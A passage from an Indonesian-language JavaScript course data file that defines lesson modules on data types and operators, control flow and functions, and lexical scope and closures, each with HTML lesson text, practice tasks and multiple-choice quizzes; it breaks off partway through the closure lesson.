/* ==========================================================================
   JAVASCRIPT — Platform Pembelajaran Interaktif
   Materi: riset Gemini (materi-gemini/javascript/), dikoreksi dan disusun oleh Claude Code.
   Dihasilkan oleh scripts/import-materi-gemini.mjs; ubah Markdown-nya, bukan berkas ini.
   ========================================================================== */

const TOPIK_SLUG = "javascript";
const TOPIK_SUB  = "interaksi di peramban";

const MODUL = [
{
    id: 1,
    kategori: "1 · Fondasi",
    judul: "Pengantar JavaScript Modern, Tipe Data, dan Operator",
    tingkat: "Dasar", durasi: "10 mnt",
    tag: ["const","undefined","null"],
    ringkas: "Memahami peran mesin JavaScript (JIT), deklarasi variabel const dan let, tujuh tipe data primitif versus objek referensi, jebakan konversi tipe implisit, serta operator modern ===, ??, dan ?..",
    isi: `
<h2>Bagaimana JavaScript Bekerja di Peramban dan Server?</h2>
<p>JavaScript adalah bahasa pemrograman berstandar <strong>ECMAScript (ECMA-262)</strong> yang menghidupkan halaman web di peramban sekaligus dapat berjalan di sisi server (melalui runtime seperti Node.js, Deno, atau Bun).</p>
<p>Meskipun sering disebut sebagai bahasa <em>interpreted</em>, mesin JavaScript modern (seperti <strong>V8</strong> di Chrome/Node.js, <strong>SpiderMonkey</strong> di Firefox, dan <strong>JavaScriptCore</strong> di Safari) menggunakan kompilasi <strong>Just-In-Time (JIT)</strong>: kode sumber Anda diurai menjadi <em>Abstract Syntax Tree (AST)</em>, diubah menjadi <em>bytecode</em> untuk dijalankan segera, dan bagian kode yang sering dipanggil (<em>hot functions</em>) dikompilasi langsung menjadi kode mesin asli yang sangat cepat!</p>
<h2>1. Deklarasi Variabel: Utamakan <code>const</code>, Gunakan <code>let</code>, Tinggalkan <code>var</code></h2>
<p>Dalam JavaScript modern (sejak ES6/ES2015), kita mendeklarasikan pengikat nilai menggunakan <strong><code>const</code></strong> atau <strong><code>let</code></strong>:</p>
<table><thead><tr><th>Kata Kunci</th><th>Cakupan (<em>Scope</em>)</th><th>Boleh Diisi Ulang (<em>Reassign</em>)?</th><th>Kapan Digunakan?</th></tr></thead><tbody><tr><td><strong><code>const</code></strong></td><td>Blok (<code>{ ... }</code>)</td><td><strong>Tidak</strong> (wajib langsung diberi nilai awal)</td><td><strong>Pilihan utama (90%+ kasus).</strong> Menjamin variabel tidak tiba-tiba ditimpa nilainya di baris bawah.</td></tr><tr><td><strong><code>let</code></strong></td><td>Blok (<code>{ ... }</code>)</td><td><strong>Ya</strong></td><td>Hanya ketika nilainya memang harus berubah (misalnya penghitung di dalam perulangan <code>for</code> atau akumulator).</td></tr><tr><td><strong><code>var</code></strong></td><td>Fungsi</td><td>Ya</td><td><strong>Jangan digunakan di kode baru.</strong> Tidak menghormati blok <code>if</code>/<code>for</code> dan rentan menimbulkan bug akibat <em>hoisting</em>.</td></tr></tbody></table>
<div class="callout waspada"><div class="callout-judul">⚠️ Kesalahpahaman Umum tentang <code>const</code> pada Objek dan Array</div><p><code>const</code> mengunci <strong>ikatannya (referensi variabelnya)</strong>, bukan membekukan isi objek di dalamnya!</p>
<pre>const konfigurasi = { port: 8080, mode: &quot;produksi&quot; };

// VALID: Mengubah properti di dalam objek yang ditunjuk oleh const
konfigurasi.port = 9000;

// GALAT (TypeError: Assignment to constant variable): Menimpa variabel dengan objek baru
// konfigurasi = { port: 3000 };</pre>
<p>Jika Anda ingin membekukan isi objek tingkat pertama agar tidak bisa diubah sama sekali, gunakan <code>Object.freeze(konfigurasi)</code>.</p></div>
<h2>2. Tujuh Tipe Primitif vs Tipe Referensi (Objek)</h2>
<p>Setiap nilai di JavaScript terbagi ke dalam dua kelompok besar:</p>
<h3>A. Tujuh Tipe Data Primitif (<em>Immutable / Disimpan berdasarkan Nilai</em>)</h3>
<ol><li><strong><code>string</code>:</strong> Teks karakter (<code>&quot;Halo&quot;</code>, <code>'Kodeloka'</code>, atau <em>template literal</em> \`<code> </code>Baris \${nomor}<code> </code>\`).</li><li><strong><code>number</code>:</strong> Bilangan IEEE 754 64-bit floating-point (mencakup bilangan bulat maupun desimal, serta nilai khusus <code>Infinity</code>, <code>-Infinity</code>, dan <code>NaN</code> / <em>Not-a-Number</em>).</li><li><strong><code>bigint</code>:</strong> Bilangan bulat dengan presisi tak terbatas untuk angka di atas batas aman <code>Number.MAX_SAFE_INTEGER</code> (<code>9007199254740991</code>), ditulis dengan akhiran <code>n</code> seperti <code>9007199254740993n</code>.</li><li><strong><code>boolean</code>:</strong> Nilai kebenaran logika <code>true</code> atau <code>false</code>.</li><li><strong><code>undefined</code>:</strong> Variabel yang sudah dideklarasikan atau properti yang belum diberi nilai.</li><li><strong><code>null</code>:</strong> Nilai kosong yang <strong>disengaja</strong> oleh pemrogram untuk menyatakan &quot;tidak ada objek/nilai&quot;.</li><li><strong><code>symbol</code>:</strong> Pengenal unik yang tidak pernah bentrok (<code>Symbol(&quot;id&quot;)</code>).</li></ol>
<h3>B. Tipe Referensi (<code>Object</code>, termasuk <code>Array</code>, <code>Function</code>, <code>Date</code>, <code>Map</code>, <code>Set</code>)</h3>
<p>Berbeda dengan tipe primitif yang disalin nilainya secara independen, variabel bertipe objek menyimpan <strong>alamat referensi memori</strong>:</p>
<pre>// 1. Primitif: disalin nilainya
let a = 10;
let b = a;
b = 20;
console.log(a); // Tetap 10

// 2. Objek/Array: menyalin alamat referensi ke objek yang sama di memori!
const daftarAsli = [&quot;HTML&quot;, &quot;CSS&quot;];
const rujukanSama = daftarAsli;
rujukanSama.push(&quot;JavaScript&quot;);

console.log(daftarAsli); // [&quot;HTML&quot;, &quot;CSS&quot;, &quot;JavaScript&quot;] — ikut berubah!</pre>
<h3>Keunikan Operator <code>typeof</code> yang Wajib Anda Ketahui</h3>
<pre>console.log(typeof &quot;Kodeloka&quot;); // &quot;string&quot;
console.log(typeof 42);         // &quot;number&quot;
console.log(typeof true);       // &quot;boolean&quot;
console.log(typeof undefined);  // &quot;undefined&quot;
console.log(typeof 100n);       // &quot;bigint&quot;

// JEBAKAN KLASIK SEJARAH JAVASCRIPT:
console.log(typeof null);       // &quot;object&quot; (Bug warisan sejak JS tahun 1995!)
// Untuk memeriksa null secara akurat, selalu gunakan: nilai === null</pre>
<h2>3. Konversi Tipe, Nilai <em>Falsy</em>, dan Mengapa Wajib Memakai <code>===</code></h2>
<p>JavaScript memiliki konsep <strong>Truthy</strong> dan <strong>Falsy</strong> ketika sebuah nilai dievaluasi di dalam kondisi boolean (seperti <code>if (nilai)</code>).</p>
<p>Hafalkan <strong>8 nilai Falsy</strong> ini (karena <strong>semua nilai lain di luar 8 ini—termasuk array kosong <code>[]</code> dan objek kosong <code>{}</code>—adalah Truthy!</strong>):</p>
<ol><li><code>false</code></li><li><code>0</code> (serta <code>-0</code> dan <code>0n</code>)</li><li><code>&quot;&quot;</code> (string kosong tanpa spasi)</li><li><code>null</code></li><li><code>undefined</code></li><li><code>NaN</code></li></ol>
<h3>Selalu Gunakan Kesetaraan Ketat (<code>===</code> dan <code>!==</code>), Jangan <code>==</code>!</h3>
<p>Operator kesetaraan longgar (<code>==</code>) melakukan pemaksaan tipe otomatis (<em>implicit type coercion</em>) dengan aturan yang membingungkan:</p>
<pre>// KEANEHAN OPERATOR LONGGAR (==):
console.log(0 == &quot;&quot;);          // true! (karena &quot;&quot; diubah menjadi 0)
console.log(false == &quot;0&quot;);     // true!
console.log(null == undefined);// true!

// STANDAR YANG BENAR: Gunakan === (memeriksa tipe data SEKALIGUS nilainya)
console.log(0 === &quot;&quot;);         // false
console.log(false === &quot;0&quot;);    // false
console.log(Number.isNaN(NaN));// true (Cara paling aman memeriksa NaN, karena NaN === NaN adalah false!)</pre>
<p>Jika Anda perlu mengubah string menjadi angka secara eksplisit, gunakan <strong><code>Number(teks)</code></strong> atau <strong><code>Number.parseInt(teks, 10)</code></strong>, bukan mengandalkan konversi otomatis dari operator <code>+</code> yang sering menyambung string secara tidak sengaja (<code>&quot;10&quot; + 5</code> menghasilkan <code>&quot;105&quot;</code>!).</p>
<h2>4. Operator Modern: Nullish Coalescing (<code>??</code>) dan Optional Chaining (<code>?.</code>)</h2>
<h3>A. Mengapa <code>??</code> Lebih Aman daripada <code>||</code> untuk Nilai Bawaan?</h3>
<p>Dulu, pengembang sering menggunakan operator OR (<code>||</code>) untuk memberi nilai bawaan: <code>const batas = inputPengguna || 10;</code>. Masalahnya: operator <code>||</code> menganggap <strong>semua nilai falsy</strong> (termasuk angka <code>0</code> dan string kosong <code>&quot;&quot;</code>) sebagai nilai yang harus diganti! Jadi jika pengguna sengaja memasukkan <code>inputPengguna = 0</code>, kode <code>0 || 10</code> justru mengubahnya menjadi <code>10</code>!</p>
<p>Operator <strong>Nullish Coalescing (<code>??</code>)</strong> (Baseline Widely Available) memperbaiki masalah ini karena <strong>hanya mengganti nilai jika sisi kirinya bernilai <code>null</code> atau <code>undefined</code></strong>:</p>
<pre>const kuotaTersisa = 0;

console.log(kuotaTersisa || 100); // 100 (SALAH! Angka 0 yang sah malah tertimpa)
console.log(kuotaTersisa ?? 100); // 0   (BENAR! Karena 0 bukan null dan bukan undefined)</pre>
<h3>B. Optional Chaining (<code>?.</code>)</h3>
<p>Mengakses properti bersarang yang mungkin belum ada biasanya memicu galat fatal <code>TypeError: Cannot read properties of undefined</code>. Dengan <strong><code>?.</code></strong>, evaluasi langsung berhenti dengan aman dan mengembalikan <code>undefined</code> jika bagian di depannya bernilai <code>null</code> atau <code>undefined</code>:</p>
<pre>const responsServer = {
  pengguna: {
    profil: { nama: &quot;Budi&quot; }
  }
};

// Aman meskipun properti 'alamat' tidak ada: menghasilkan &quot;Kota belum diisi&quot;
const kota = responsServer.pengguna?.alamat?.kota ?? &quot;Kota belum diisi&quot;;
console.log(kota);</pre>
<h2>Latihan Praktik: Mengolah Konfigurasi Server dengan Aman</h2>
<p>Buatlah berkas <code>tipe-dan-operator.js</code> lalu jalankan dengan <code>node tipe-dan-operator.js</code>:</p>
<ol><li>Buat objek <code>konfigurasiMasukan</code> yang memiliki <code>{ host: &quot;127.0.0.1&quot;, batasCobaUlang: 0, tls: null }</code>.</li><li>Gunakan operator <code>??</code> dan <code>?.</code> untuk menyusun objek <code>konfigurasiAktif</code> di mana <code>batasCobaUlang</code> tetap bernilai <code>0</code> (tidak tertimpa menjadi nilai bawaan <code>3</code>), <code>port</code> bernilai bawaan <code>8080</code> karena tidak ada di masukan, dan <code>sertifikatTls</code> membaca <code>konfigurasiMasukan.tls?.jalurBerkas ?? &quot;/etc/ssl/default.pem&quot;</code>.</li><li>Cetak hasilnya dengan <code>console.log(konfigurasiAktif)</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Grammar_and_types" rel="noopener">Grammar and types — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Data_structures" rel="noopener">JavaScript data types and data structures — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification — TC39</a></li></ul></div>
`,
    perintah: ["const","undefined","null","??","let","0"],
    kuis: [
        {"tanya":"Perhatikan kode berikut: ```js const diskonPersen = 0; const hasilA = diskonPersen || 15; const hasilB = diskonPersen ?? 15; ``` Berapakah nilai dari hasilA dan hasilB?","opsi":["hasilA adalah 0, dan hasilB adalah 0.","hasilA adalah 15, dan hasilB adalah 0.","hasilA adalah 0, dan hasilB adalah 15.","hasilA adalah 15, dan hasilB adalah 15."],"benar":1,"penjelasan":"Operator logika || mengembalikan operan kanan jika operan kiri bersifat falsy (dan angka 0 termasuk falsy), sehingga hasilA menjadi 15. Sebaliknya, operator nullish coalescing ?? hanya mengembalikan operan kanan jika operan kiri bernilai null atau undefined, sehingga angka 0 dipertahankan pada hasilB."},
        {"tanya":"Apa hasil dari evaluasi ekspresi Boolean([]) dan typeof null di dalam JavaScript?","opsi":["false dan \"null\"","true dan \"object\"","false dan \"object\"","true dan \"undefined\""],"benar":1,"penjelasan":"Di JavaScript, array kosong [] dan objek kosong {} adalah objek yang valid sehingga selalu bernilai truthy (Boolean([]) === true). Adapun typeof null mengembalikan \"object\" karena perilaku historis mesin JavaScript sejak versi pertamanya."},
        {"tanya":"Mengapa cara yang benar untuk memeriksa apakah sebuah nilai adalah NaN (Not-a-Number) adalah menggunakan Number.isNaN(nilai), bukan nilai === NaN?","opsi":["Karena kata kunci NaN tidak boleh ditulis di sebelah kanan operator ===.","Karena menurut spesifikasi IEEE 754, NaN adalah satu-satunya nilai di JavaScript yang tidak sama dengan dirinya sendiri (NaN === NaN selalu menghasilkan false).","Karena nilai === NaN selalu menghasilkan true untuk semua angka negatif.","Karena Number.isNaN() mengubah nilai tersebut menjadi angka 0."],"benar":1,"penjelasan":"Dalam standar bilangan titik-ambang IEEE 754 yang diadopsi ECMAScript, perbandingan NaN === NaN selalu bernilai false. Fungsi Number.isNaN(nilai) memeriksa secara presisi apakah nilai tersebut bertipe number dan bernilai NaN."}
    ]
},
{
    id: 2,
    kategori: "1 · Fondasi",
    judul: "Alur Kontrol, Perulangan Modern, dan Fungsi Kelas Satu",
    tingkat: "Dasar", durasi: "9 mnt",
    tag: ["for...of","for...in","Pesanan #${pesanan.id} siap dikirim."],
    ringkas: "Mengendalikan alur eksekusi dengan if/else, guard clauses, dan perulangan for...of, serta memahami fungsi sebagai warga kelas satu (first-class citizens), perbedaan deklarasi fungsi dan arrow function (=>), parameter bawaan, dan rest parameters (...).",
    isi: `
<h2>1. Percabangan yang Bersih dengan Pola <em>Guard Clause</em> (Early Return)</h2>
<p>Percabangan <code>if / else if / else</code> dan <code>switch</code> adalah fondasi logika program. Namun, pemula sering menulis <code>if</code> bersarang terlalu dalam (<em>nested arrow anti-pattern</em>) yang sulit dibaca:</p>
<pre>// BURUK: Bersarang terlalu dalam sehingga inti logika terkubur di paling tengah
function prosesPesananLama(pesanan) {
  if (pesanan !== null &amp;&amp; pesanan !== undefined) {
    if (pesanan.barang.length &gt; 0) {
      if (pesanan.sudahDibayar) {
        return \`Pesanan #\${pesanan.id} siap dikirim.\`;
      } else {
        return &quot;Menunggu pembayaran.&quot;;
      }
    } else {
      return &quot;Keranjang pesanan kosong.&quot;;
    }
  } else {
    return &quot;Data pesanan tidak ditemukan.&quot;;
  }
}

// LEBIH BAIK: Gunakan Guard Clauses (kembalikan kasus gagal di awal fungsi!)
function prosesPesanan(pesanan) {
  if (!pesanan) return &quot;Data pesanan tidak ditemukan.&quot;;
  if (pesanan.barang.length === 0) return &quot;Keranjang pesanan kosong.&quot;;
  if (!pesanan.sudahDibayar) return &quot;Menunggu pembayaran.&quot;;

  return \`Pesanan #\${pesanan.id} siap dikirim.\`;
}</pre>
<p>Dengan pola <strong>Guard Clause</strong>, semua kondisi tidak valid ditangani dan dihentikan di bagian atas fungsi, sehingga jalur sukses utama (<em>happy path</em>) berada di tingkat indentasi paling luar yang bersih.</p>
<h2>2. Perulangan Modern: <code>for...of</code> vs <code>for</code> Klasik vs <code>for...in</code></h2>
<p>JavaScript menyediakan beberapa cara melakukan perulangan, namun masing-masing memiliki peruntukan yang tegas:</p>
<table><thead><tr><th>Jenis Perulangan</th><th>Sintaks</th><th>Gunakan Untuk Apa?</th></tr></thead><tbody><tr><td><strong><code>for...of</code></strong></td><td><code>for (const item of daftar)</code></td><td><strong>Pilihan utama untuk mengiterasi nilai</strong> di dalam <code>Array</code>, <code>String</code>, <code>Map</code>, <code>Set</code>, atau <code>NodeList</code> DOM. Mendukung <code>break</code>, <code>continue</code>, dan <code>await</code>!</td></tr><tr><td><strong><code>for</code> klasik</strong></td><td><code>for (let i = 0; i &lt; n; i++)</code></td><td>Saat Anda benar-benar membutuhkan hitungan indeks angka manual (misalnya melompat 2 indeks sekaligus <code>i += 2</code> atau berjalan mundur).</td></tr><tr><td><strong><code>Object.entries()</code> + <code>for...of</code></strong></td><td><code>for (const [kunci, nilai] of Object.entries(obj))</code></td><td><strong>Pilihan terbaik untuk mengiterasi pasangan kunci dan nilai dari sebuah Objek (<code>{}</code>).</strong></td></tr><tr><td><strong><code>for...in</code></strong></td><td><code>for (const kunci in obj)</code></td><td><strong>Hindari untuk Array!</strong> <code>for...in</code> mengiterasi kunci properti string (termasuk properti yang diwarisi dari rantai prototipe).</td></tr></tbody></table>
<pre>const modulKelas = [&quot;Cara Web Bekerja&quot;, &quot;Struktur HTML&quot;, &quot;Teks Semantik&quot;];

// 1. Mengiterasi nilai Array dengan for...of
for (const judul of modulKelas) {
  console.log(judul);
}

// 2. Jika Anda butuh nomor indeks SEKALIGUS nilainya di for...of, gunakan .entries():
for (const [indeks, judul] of modulKelas.entries()) {
  console.log(\`Modul \${indeks + 1}: \${judul}\`);
}</pre>
<h2>3. Fungsi sebagai Warga Kelas Satu (<em>First-Class Functions</em>)</h2>
<p>Di JavaScript, fungsi bukanlah struktur kaku yang terpisah dari data, melainkan **warga kelas satu (<em>first-class citizens</em>)**. Artinya, sebuah fungsi dapat:</p>
<ol><li>Disimpan di dalam variabel atau properti objek (<code>const hitung = function() {}</code>).</li><li>Dikirimkan sebagai argumen ke fungsi lain (disebut <strong>Callback Function</strong>).</li><li>Dikembalikan (<em>returned</em>) sebagai nilai hasil dari fungsi lain (disebut <strong>Higher-Order Function</strong>).</li></ol>
<h3>Tiga Cara Mendefinisikan Fungsi dan Perbedaannya</h3>
<pre>// 1. Function Declaration (Mengalami hoisting penuh: bisa dipanggil sebelum baris deklarasinya)
function hitungTotal(harga, jumlah = 1) {
  return harga * jumlah;
}

// 2. Function Expression (Disimpan ke variabel const; tidak bisa dipanggil sebelum baris ini)
const formatRupiah = function (nominal) {
  return \`Rp\${nominal.toLocaleString(&quot;id-ID&quot;)}\`;
};

// 3. Arrow Function (Ringkas; ekspresi satu baris otomatis mengembalikan nilai tanpa kata kunci return)
const hitungPajak = (nominal, tarif = 0.11) =&gt; nominal * tarif;

// Catatan: Jika Arrow Function langsung mengembalikan objek literal {}, bungkus dengan tanda kurung ()!
const buatPengguna = (nama, peran) =&gt; ({ nama, peran, aktif: true });</pre>
<h3>Perbedaan Teknis Penting: <code>function</code> Biasa vs Arrow Function (<code>=&gt;</code>)</h3>
<p>Arrow function <strong>bukan</strong> sekadar singkatan penulisan dari <code>function</code> biasa. Ada tiga perbedaan perilaku fundamental:</p>
<ol><li><strong>Tidak memiliki ikatan <code>this</code> sendiri:</strong> Arrow function mewarisi nilai <code>this</code> dari cakupan (<em>lexical scope</em>) di sekitarnya. Ini membuat arrow function <strong>sangat ideal untuk callback</strong> (di dalam <code>setTimeout</code>, <code>.map()</code>, atau <code>addEventListener</code> di dalam class), tetapi <strong>tidak cocok untuk metode objek literal</strong> yang perlu mengakses <code>this.properti</code> objek tersebut.</li><li><strong>Tidak dapat dipanggil dengan kata kunci <code>new</code></strong> (bukan <em>constructor</em>).</li><li><strong>Tidak memiliki objek implisit <code>arguments</code></strong> (sebagai gantinya, gunakan <em>rest parameters</em> <code>...args</code> yang jauh lebih modern).</li></ol>
<h2>4. Parameter Bawaan (<em>Default Parameters</em>) dan <em>Rest Parameters</em> (<code>...</code>)</h2>
<h3>A. Parameter Bawaan yang Dievaluasi Saat Pemanggilan</h3>
<p>Nilai bawaan parameter hanya digunakan jika argumen tidak dikirim atau bernilai <strong><code>undefined</code></strong> (jika Anda mengirim <code>null</code>, maka nilai <code>null</code> tetap dipakai):</p>
<pre>function buatKoneksi(host = &quot;localhost&quot;, port = 5432) {
  return \`postgres://\${host}:\${port}/kodeloka\`;
}

console.log(buatKoneksi());                  // &quot;postgres://localhost:5432/kodeloka&quot;
console.log(buatKoneksi(&quot;db.internal&quot;));     // &quot;postgres://db.internal:5432/kodeloka&quot;
console.log(buatKoneksi(undefined, 6432));   // &quot;postgres://localhost:6432/kodeloka&quot;</pre>
<h3>B. Mengumpulkan Sisa Argumen dengan <em>Rest Parameters</em> (<code>...nama</code>)</h3>
<p>Sintaks tiga titik (<code>...</code>) pada parameter terakhir sebuah fungsi mengumpulkan seluruh sisa argumen yang dikirimkan ke dalam sebuah <strong><code>Array</code> asli</strong>:</p>
<pre>function catatLog(tingkat, ...pesan) {
  const gabungPesan = pesan.join(&quot; | &quot;);
  return \`[\${tingkat.toUpperCase()}] \${gabungPesan}\`;
}

console.log(catatLog(&quot;info&quot;, &quot;Server menyala&quot;, &quot;Port 8080&quot;, &quot;Mode produksi&quot;));
// Keluaran: &quot;[INFO] Server menyala | Port 8080 | Mode produksi&quot;</pre>
<h2>Latihan Praktik: Membuat Kalkulator Tagihan Fleksibel</h2>
<p>Buatlah berkas <code>fungsi-tagihan.js</code> lalu jalankan dengan Node.js:</p>
<ol><li>Buat fungsi <code>hitungTagihanAkhir(diskonPersen = 0, ...daftarHargaBarang)</code> yang menggunakan <em>guard clause</em> (mengembalikan <code>0</code> jika <code>daftarHargaBarang</code> kosong).</li><li>Gunakan perulangan <code>for...of</code> untuk menjumlahkan seluruh harga di dalam <code>daftarHargaBarang</code>.</li><li>Kurangi total dengan persentase diskon, tambahkan PPN 11%, dan kembalikan objek ringkasan <code>{ subtotal, diskonNominal, pajak, totalAkhir }</code>.</li></ol>
<div class="callout info"><div class="callout-judul">📚 Rujukan</div><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Control_flow_and_error_handling" rel="noopener">Control flow and error handling — MDN Web Docs</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Functions" rel="noopener">Functions — MDN Web Docs</a></li><li><a href="https://tc39.es/ecma262/" rel="noopener">ECMAScript Language Specification — TC39</a></li></ul></div>
`,
    perintah: ["for...of","for...in","Pesanan #${pesanan.id} siap dikirim.","for","Array","function"],
    kuis: [
        {"tanya":"Mengapa penulisan arrow function const buatTitik = (x, y) => { x: x, y: y }; menghasilkan undefined (atau galat sintaks) alih-alih mengembalikan objek { x, y }?","opsi":["Karena arrow function tidak diizinkan mengembalikan objek di JavaScript.","Karena tanda kurung kurawal { ... } tepat setelah tanda panah => ditafsirkan oleh parser JavaScript sebagai pembuka blok tubuh fungsi (function body), bukan objek literal; untuk mengembalikan objek secara langsung, kurung kurawal harus dibungkus tanda kurung biasa: ({ x, y }).","Karena parameter x dan y belum diberi nilai bawaan.","Karena arrow function wajib menggunakan kata kunci function."],"benar":1,"penjelasan":"Parser JavaScript menganggap { setelah => sebagai awal blok kode multi-baris. Membungkusnya dengan tanda kurung lengkung (x, y) => ({ x, y }) mengubahnya menjadi ekspresi objek literal yang langsung dikembalikan."},
        {"tanya":"Manakah cara yang paling tepat dan modern di JavaScript untuk melakukan perulangan terhadap nilai-nilai di dalam sebuah Array sambil tetap bisa menggunakan perintah break atau await di dalamnya?","opsi":["for (const indeks in daftarArray)","for (const item of daftarArray)","daftarArray.forEach(...)","Object.keys(daftarArray)"],"benar":1,"penjelasan":"Perulangan for...of mengiterasi nilai elemen secara langsung serta mendukung perintah break, continue, return, dan await (tidak seperti .forEach() yang tidak dapat dihentikan dengan break dan tidak menunggu await). Sementara itu, for...in mengiterasi kunci string dan tidak disarankan untuk Array."},
        {"tanya":"Perhatikan fungsi berikut: ```js function sapa(nama = \"Pengunjung\") { return Halo, ${nama}!; } ``` Apa nilai kembalian dari sapa(undefined) dan sapa(null)?","opsi":["Keduanya mengembalikan \"Halo, Pengunjung!\".","sapa(undefined) mengembalikan \"Halo, Pengunjung!\", sedangkan sapa(null) mengembalikan \"Halo, null!\".","sapa(undefined) mengembalikan \"Halo, undefined!\", sedangkan sapa(null) mengembalikan \"Halo, Pengunjung!\".","Keduanya memicu TypeError."],"benar":1,"penjelasan":"Parameter bawaan (default parameters) di JavaScript hanya diaktifkan apabila argumen tidak diberikan atau bernilai tepat undefined. Nilai null dianggap sebagai nilai eksplisit yang sah, sehingga tidak memicu parameter bawaan."}
    ]
},
{
    id: 3,
    kategori: "1 · Fondasi",
    judul: "Lexical Scope, Temporal Dead Zone (TDZ), dan Closure",
    tingkat: "Menengah", durasi: "10 mnt",
    tag: ["let","var","const"],
    ringkas: "Memahami aturan visibilitas variabel melalui lexical scoping, mengapa let dan const memiliki Temporal Dead Zone, serta bagaimana fungsi mempertahankan akses ke lingkungannya melalui mekanisme Closure beserta penerapannya di dunia nyata.",
    isi: `
<h2>1. Lexical Scope (Cakupan Leksikal)</h2>
<p>Di JavaScript, visibilitas suatu variabel ditentukan oleh <strong>lokasi fisik tempat variabel dan fungsi tersebut ditulis di dalam kode sumber</strong>—ini disebut <strong>Lexical Scoping</strong> (atau <em>Static Scoping</em>).</p>
<p>Bayangkan <em>scope</em> seperti kaca satu arah dari dalam ruangan ke luar:</p>
<ul><li>**Kode di cakupan dalam (<em>inner scope</em>)** selalu dapat melihat dan mengakses variabel yang berada di cakupan luarnya (<em>outer/parent scope</em>).</li><li>**Kode di cakupan luar (<em>outer scope</em>)<strong> </strong>tidak pernah** dapat mengintip variabel yang dideklarasikan di dalam cakupan anak!</li></ul>
<pre>const namaAplikasi = &quot;Kodeloka&quot;; // 1. Global / Module Scope

function tampilkanKelas(namaKelas) {
  // 2. Function Scope: bisa mengakses 'namaAplikasi' dan 'namaKelas'
  const prefix = &quot;[KELAS]&quot;;

  if (namaKelas === &quot;JavaScript&quot;) {
    // 3. Block Scope: bisa mengakses 'prefix', 'namaKelas', dan 'namaAplikasi'
    const tingkat = &quot;Menengah&quot;;
    console.log(\`\${prefix} \${namaAplikasi} - \${namaKelas} (\${tingkat})\`);
  }

  // ReferenceError! 'tingkat' hanya hidup di dalam blok kurung kurawal if { ... }
  // console.log(tingkat);
}</pre>
<h3>Rantai Cakupan (<em>Scope Chain</em>)</h3>
<p>Ketika Anda menggunakan sebuah variabel di dalam fungsi, mesin JavaScript mencarinya secara berjenjang ke atas: <code>Cakupan Blok Saat Ini -&gt; Cakupan Fungsi Induk -&gt; Cakupan Fungsi Luar -&gt; Cakupan Modul/Global</code>. Begitu variabel ditemukan di salah satu lapis terdekat, pencarian berhenti. Jika sampai ke puncak global tetap tidak ditemukan, mesin melempar <strong><code>ReferenceError: x is not defined</code></strong>.</p>
<h2>2. Hoisting dan <em>Temporal Dead Zone (TDZ)</em></h2>
<p>Istilah <strong>Hoisting</strong> merujuk pada cara mesin JavaScript mendaftarkan seluruh deklarasi variabel dan fungsi ke dalam memori cakupan sebelum mengeksekusi kode baris demi baris.</p>
<p>Namun, perilaku pendaftaran ini sangat berbeda antara <code>function</code>, <code>var</code>, dan <code>let</code>/<code>const</code>:</p>
<table><thead><tr><th>Deklarasi</th><th>Apakah Terdaftar di Awal Scope?</th><th>Nilai Awal Sebelum Baris Deklarasinya Dieksekusi</th><th>Apa yang Terjadi Jika Diakses Sebelum Baris Deklarasinya?</th></tr></thead><tbody><tr><td><code>function nama() {}</code></td><td>Ya</td><td>Fungsi utuh siap pakai</td><td><strong>Berhasil dijalankan</strong> dengan normal.</td></tr><tr><td><code>var x = 10;</code></td><td>Ya (di tingkat fungsi)</td><td>Diinisialisasi sebagai <code>undefined</code></td><td>Menghasilkan <strong><code>undefined</code></strong> secara diam-diam (sumber bug yang membingungkan!).</td></tr><tr><td><code>let x = 10;</code> / <code>const y = 20;</code></td><td>Ya (di tingkat blok)</td><td>**Belum diinisialisasi (<em>Uninitialized</em>)**</td><td>Langsung melempar <strong><code>ReferenceError: Cannot access 'x' before initialization</code></strong>!</td></tr></tbody></table>
<p>Rentang baris sejak awal blok <code>{</code> hingga baris tempat <code>let</code> atau <code>const</code> dideklarasikan disebut <strong>Temporal Dead Zone (TDZ)</strong>:</p>
<pre>{
  // --- Awal Temporal Dead Zone (TDZ) untuk variabel 'tarif' ---
  // console.log(tarif); // ReferenceError! Aman dari bug pemakaian variabel sebelum waktunya.

  const tarif = 15000;   // --- Akhir TDZ: 'tarif' resmi diinisialisasi ---
  console.log(tarif);    // 15000
}</pre>
<h2>3. Apa Itu Closure dan Bagaimana Cara Kerjanya?</h2>
<p><strong>Closure</strong> adalah salah satu konsep paling kuat di JavaScript. Definisi resminya menurut <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Closures" rel="noopener">MDN Web Docs</a>:</p>
<div class="callout info"><p><strong>Closure</strong> adalah gabungan dari sebuah fungsi beserta bundel referensi ke lingkungan leksikal (<em>lexical environment</em>) tempat fungsi tersebut diciptakan.</p></div>
<p>Secara sederhana: **ketika sebuah fungsi dalam (<em>inner function</em>) dikembalikan keluar dari fungsi induknya, fungsi dalam tersebut membawa &quot;tas ransel&quot; berisi variabel-variabel milik fungsi induk yang masih ia butuhkan**, sehingga variabel-variabel tersebut tidak dihapus oleh <em>Garbage Collector</em> meskipun fungsi induknya sudah selesai dijalankan!</p>
<pre>buatPenghitung(awal = 0) selesai dijalankan, TETAPI:
+-------------------------------------------------------+
| Fungsi yang dikembalikan (tambah)                     |
|   │                                                   |
|   └── [Tas Ransel / Closure Environment]              |
|         └── let nilai = 0  (Privat! Tidak bisa        |
|                             diakses langsung dari luar)|
+-------------------------------------------------------+</pre>
<h3>Contoh Nyata 1: Mengemas State Privat (<em>Data Encapsulation</em>)</h3>
<pre>function buatDompet(saldoAwal = 0) {
  // Variabel 'saldo' bersifat PRIVAT di dalam closure ini.
  // Kode di luar tidak bisa mengubah 'saldo = 999999999' secara langsung!
  let saldo = saldoAwal;

  return {
    lihatSaldo() {
      return saldo;
    },
    setor(jumlah) {
      if (jumlah &lt;= 0) throw new Error(&quot;Jumlah setoran harus lebih dari 0.&quot;);
      saldo += jumlah;
      return saldo;
    },
    tarik(jumlah) {
      if (jumlah &gt; saldo) throw new Error(&quot;Saldo tidak mencukupi.&quot;);
      saldo -= jumlah;
      return saldo;
    }
  };
}

const dompetBudi = buatDompet(100_000);
dompetBudi.setor(50_000);
